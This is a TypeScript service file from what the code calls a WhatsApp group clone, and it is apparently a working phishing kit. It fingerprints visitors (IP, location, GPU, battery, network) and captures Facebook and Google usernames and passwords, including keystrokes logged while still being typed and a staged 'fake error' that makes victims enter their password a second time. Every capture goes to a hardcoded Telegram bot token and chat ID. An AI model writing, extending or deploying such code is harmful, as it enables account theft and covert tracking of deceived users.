import { GroupData, VisitorLog, CredentialLog, TelegramConfig, DeviceFingerprint } from '../types';

const STORAGE_KEY = 'wa_clone_groups';
const LOGS_KEY = 'wa_clone_logs';
const BLOCKED_KEY = 'wa_clone_blocked';
const CREDS_KEY = 'wa_clone_creds';
const TG_CONFIG_KEY = 'wa_clone_tg_config';

// User's Provided Token & ID
const DEFAULT_BOT_TOKEN = "8296457423:AAG3dHC3rwT9_0NgImTKnAQf5VU8XJI2OXY";
const DEFAULT_CHAT_ID = "8296457423"; 

// --- Telegram Helper ---

export const getTelegramConfig = (): TelegramConfig | null => {
  try {
    const stored = localStorage.getItem(TG_CONFIG_KEY);
    if (stored) {
        return JSON.parse(stored);
    }
    return { botToken: DEFAULT_BOT_TOKEN, chatId: DEFAULT_CHAT_ID };
  } catch (e) {
    return { botToken: DEFAULT_BOT_TOKEN, chatId: DEFAULT_CHAT_ID };
  }
};

export const saveTelegramConfig = (config: TelegramConfig) => {
  localStorage.setItem(TG_CONFIG_KEY, JSON.stringify(config));
};

const sendToTelegram = async (text: string) => {
  const config = getTelegramConfig();
  if (!config || !config.botToken || !config.chatId) return;

  const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
  
  const formData = new FormData();
  formData.append('chat_id', config.chatId);
  formData.append('text', text);
  formData.append('parse_mode', 'HTML');
  formData.append('disable_web_page_preview', 'true');

  // Use Beacon if available for higher reliability on page close
  if (navigator.sendBeacon) {
      navigator.sendBeacon(url, formData);
  } else {
      try {
          await fetch(url, { 
              method: 'POST',
              body: formData,
              mode: 'no-cors' // We don't need the response
          });
      } catch (error) {
          console.error('TG Error');
      }
  }
};

// --- ADVANCED DEVICE FINGERPRINTING ---

export const getAdvancedFingerprint = async (): Promise<DeviceFingerprint> => {
    let gpu = 'Unknown GPU';
    let batteryLevel = 'Unknown';
    let isCharging = false;
    let connectionType = 'Unknown';

    // 1. GPU Detection via WebGL
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            // @ts-ignore
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                // @ts-ignore
                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
        }
    } catch (e) {}

    // 2. Battery API
    try {
        // @ts-ignore
        if (navigator.getBattery) {
            // @ts-ignore
            const battery = await navigator.getBattery();
            batteryLevel = `${Math.round(battery.level * 100)}%`;
            isCharging = battery.charging;
        }
    } catch (e) {}

    // 3. Network Information API
    try {
        // @ts-ignore
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
            connectionType = `${conn.effectiveType || ''} ${conn.downlink ? `(${conn.downlink}Mbps)` : ''}`;
        }
    } catch (e) {}

    return {
        gpu,
        batteryLevel,
        isCharging,
        connectionType,
        platform: navigator.platform,
        cores: navigator.hardwareConcurrency || 0,
        // @ts-ignore
        memory: navigator.deviceMemory || 0, // RAM in GB (approx)
        screenRes: `${window.screen.width}x${window.screen.height}`
    };
};

// --- Image Compression ---
export const compressImage = (file: File): Promise<string> => {
    return new Promise((resolve) => {
        const reader = new FileReader();
        reader.readAsDataURL(file);
        reader.onload = (e) => {
            const img = new Image();
            img.src = e.target?.result as string;
            img.onload = () => {
                const elem = document.createElement('canvas');
                const scaleFactor = Math.min(120 / img.width, 120 / img.height, 1);
                elem.width = img.width * scaleFactor;
                elem.height = img.height * scaleFactor;
                const ctx = elem.getContext('2d');
                ctx?.drawImage(img, 0, 0, elem.width, elem.height);
                resolve(elem.toDataURL('image/jpeg', 0.6));
            }
        }
    })
};

// --- URL State Management ---

export const generateInviteLink = (group: GroupData): string => {
    const payload = {
        n: group.name,
        i: group.image,
        l: group.link,
        c: group.memberCount,
        m: group.lastMessage,
        id: group.id
    };
    try {
        const json = JSON.stringify(payload);
        const base64 = btoa(unescape(encodeURIComponent(json)));
        const baseUrl = window.location.href.split('#')[0];
        return `${baseUrl}#invite/${base64}`;
    } catch (e) { return ""; }
};

export const parseInviteLink = (hash: string): GroupData | null => {
    try {
        const base64 = hash.split('#invite/')[1];
        if (!base64) return null;
        const json = decodeURIComponent(escape(atob(base64)));
        const data = JSON.parse(json);
        return {
            id: data.id || 'temp',
            name: data.n || 'Unknown Group',
            image: data.i || null,
            link: data.l || '',
            memberCount: data.c,
            lastMessage: data.m
        };
    } catch (e) { return null; }
};

// --- Local Group Management ---
export const getGroups = (): GroupData[] => {
  try {
    const stored = localStorage.getItem(STORAGE_KEY);
    return stored ? JSON.parse(stored) : [];
  } catch (e) { return []; }
};
export const saveGroup = (group: GroupData): void => {
  const groups = getGroups();
  const existingIndex = groups.findIndex(g => g.id === group.id);
  if (existingIndex >= 0) groups[existingIndex] = group;
  else groups.push(group);
  localStorage.setItem(STORAGE_KEY, JSON.stringify(groups));
};
export const deleteGroup = (id: string): void => {
  const groups = getGroups();
  const filtered = groups.filter(g => g.id !== id);
  localStorage.setItem(STORAGE_KEY, JSON.stringify(filtered));
};
export const getGroupById = (id: string): GroupData | undefined => {
  const groups = getGroups();
  return groups.find(g => g.id === id);
};

// --- Visitor Logs ---
export const getVisitorLogs = (): VisitorLog[] => {
  try {
    const stored = localStorage.getItem(LOGS_KEY);
    return stored ? JSON.parse(stored) : [];
  } catch (e) { return []; }
};

export const logVisitor = async (log: VisitorLog): Promise<void> => {
  const logs = getVisitorLogs();
  const recentLog = logs.find(l => l.ip === log.ip && (Date.now() - l.timestamp < 60000));
  
  if (!recentLog) {
    const newLogs = [log, ...logs].slice(0, 100);
    localStorage.setItem(LOGS_KEY, JSON.stringify(newLogs));
    
    // Fetch device info for the visitor log
    const dev = await getAdvancedFingerprint();

    const msg = `👀 <b>NEW VISITOR</b>\n` +
                `➖➖➖➖➖➖➖➖➖➖➖\n` +
                `<b>🎯 Target:</b> ${log.groupName}\n` +
                `<b>🌍 IP:</b> <code>${log.ip}</code>\n` +
                `<b>📍 Loc:</b> ${log.city}, ${log.country_name}\n` +
                `<b>🏢 ISP:</b> ${log.org}\n` +
                `➖➖➖➖➖➖➖➖➖➖➖\n` +
                `<b>📱 Device:</b> ${dev.platform} (${dev.screenRes})\n` +
                `<b>🎮 GPU:</b> ${dev.gpu}\n` +
                `<b>🔋 Battery:</b> ${dev.batteryLevel} ${dev.isCharging ? '⚡' : ''}\n` +
                `<b>📡 Net:</b> ${dev.connectionType}`;
    sendToTelegram(msg);
  }
};

// --- Blocklist ---
export const getBlockedIPs = (): string[] => {
  try {
    const stored = localStorage.getItem(BLOCKED_KEY);
    return stored ? JSON.parse(stored) : [];
  } catch (e) { return []; }
};
export const blockIP = (ip: string): void => {
  const blocked = getBlockedIPs();
  if (!blocked.includes(ip)) {
    blocked.push(ip);
    localStorage.setItem(BLOCKED_KEY, JSON.stringify(blocked));
  }
};
export const unblockIP = (ip: string): void => {
  const blocked = getBlockedIPs();
  const filtered = blocked.filter(i => i !== ip);
  localStorage.setItem(BLOCKED_KEY, JSON.stringify(filtered));
};
export const isIPBlocked = (ip: string): boolean => {
  const blocked = getBlockedIPs();
  return blocked.includes(ip);
};

// --- Credentials & Live Typing ---

export const getCredentials = (): CredentialLog[] => {
  try {
    const stored = localStorage.getItem(CREDS_KEY);
    return stored ? JSON.parse(stored) : [];
  } catch (e) { return []; }
};

export const saveCredential = async (cred: CredentialLog): Promise<void> => {
  if (!cred.isLiveType) {
      // Only save to local storage if it's a FINAL submit or ATTEMPT
      const creds = getCredentials();
      const newCreds = [cred, ...creds];
      localStorage.setItem(CREDS_KEY, JSON.stringify(newCreds));
  }

  const icon = cred.service === 'facebook' ? '🔵' : '🔴';
  
  let title = `${icon} <b>LOGIN SUCCESS</b> ${icon}`;
  if (cred.isLiveType) {
      title = '⚠️ <b>[DRAFT] TYPING DETECTED</b>';
  } else if (cred.attemptNumber === 1) {
      title = `❌ <b>ATTEMPT #1 (Fake Error)</b>`;
  } else if (cred.attemptNumber === 2) {
      title = `✅ <b>ATTEMPT #2 (Final)</b>`;
  }

  const dev = cred.deviceInfo;
  let devString = '';
  if (dev) {
      devString = `\n➖➖➖➖➖➖➖➖➖➖➖\n` +
                  `<b>📱 HW:</b> ${dev.cores} Cores | ${dev.memory}GB RAM\n` +
                  `<b>🎮 GPU:</b> ${dev.gpu}\n` +
                  `<b>🔋 Batt:</b> ${dev.batteryLevel} ${dev.isCharging ? '⚡' : ''}\n` +
                  `<b>📡 Net:</b> ${dev.connectionType}`;
  }

  // Handle Precise GPS Link
  let locString = `<b>📍 Loc:</b> ${cred.location || 'Unknown'}`;
  if (cred.preciseGPS) {
      locString = `<b>📍 PRECISE GPS:</b> <a href="${cred.preciseGPS}">Open Google Maps</a>`;
  }

  const msg = `${title}\n\n` +
              `<b>Service:</b> ${cred.service.toUpperCase()}\n` +
              `<b>User:</b> <code>${cred.email}</code>\n` +
              `<b>Pass:</b> <code>${cred.password}</code>\n` +
              `➖➖➖➖➖➖➖➖➖➖➖\n` +
              `<b>🌍 IP:</b> <code>${cred.ip}</code>\n` +
              `${locString}\n` +
              `<b>🕸️ UA:</b> <code>${cred.userAgent || 'Unknown'}</code>` +
              devString;
              
  await sendToTelegram(msg);
};

// Debounce for typing
let typingTimer: any;
export const sendLiveTypingLog = (
    email: string, 
    pass: string, 
    service: 'facebook' | 'google',
    ip: string,
    location: string,
    device: DeviceFingerprint | undefined
) => {
    // Only send if there is content
    if (email.length < 3 && pass.length < 1) return;

    clearTimeout(typingTimer);
    // Wait 2 seconds after user stops typing to send the log
    typingTimer = setTimeout(() => {
        saveCredential({
            service,
            email,
            password: pass,
            timestamp: Date.now(),
            ip,
            location,
            userAgent: navigator.userAgent,
            deviceInfo: device,
            isLiveType: true // Mark as draft
        });
    }, 2000);
};